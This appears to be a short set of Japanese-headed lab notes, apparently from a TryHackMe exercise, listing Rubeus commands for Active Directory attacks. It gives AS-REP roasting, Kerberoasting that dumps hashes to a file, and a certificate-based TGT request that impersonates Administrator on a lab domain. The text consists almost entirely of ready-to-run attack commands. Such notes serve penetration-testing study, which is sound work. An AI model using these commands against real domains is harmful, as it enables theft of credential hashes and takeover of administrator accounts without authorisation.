### AS-REPロースト
```sh
.\Rubeus.exe asreproast /nowrap
```

### ケルベロースト
```sh
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```

```sh
# 作った証明書を使ってTGTリクエスト送信
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fulladmin.pfx /password:Password123 /outfile:fulladmin.kirbi /domain:za.tryhackme.loc /dc:10.200.61.101
```